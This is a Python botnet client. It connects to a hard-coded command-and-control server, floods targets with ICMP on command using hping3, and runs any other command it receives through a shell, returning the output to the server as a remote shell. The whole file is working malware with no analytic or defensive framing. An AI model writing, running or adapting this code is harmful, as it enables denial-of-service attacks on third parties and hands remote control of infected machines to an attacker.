import socket
import subprocess
import threading

# Define the target and control variables globally
target = None
attack_active = False

def flood_attack():
    """Function to perform the flood attack using hping3."""
    global attack_active, target
    while attack_active and target:
        attack_command = f"hping3 -1 --flood {target}"
        subprocess.run(attack_command, shell=True)

def manage_attack(command):
    """Manage the starting and stopping of the flood attack."""
    global attack_active, target
    if command.startswith('attack'):
        _, target = command.split()
        if not attack_active:
            attack_active = True
            threading.Thread(target=flood_attack).start()
    elif command == 'stop':
        attack_active = False
        target = None

# Main connection setup to the C&C server
bot_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
bot_socket.connect(("244.178.44.111", 8080))

try:
    while True:
        # Waiting for a command
        command = bot_socket.recv(1024).decode().strip().lower()

        if command == 'exit':
            # Close the connection
            bot_socket.close()
            break
        elif 'attack' in command or command == 'stop':
            manage_attack(command)
        else:
            # Execute other commands and send output back to the server
            process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            output = process.stdout.read() + process.stderr.read()
            bot_socket.sendall(output)
finally:
    bot_socket.close()
    attack_active = False
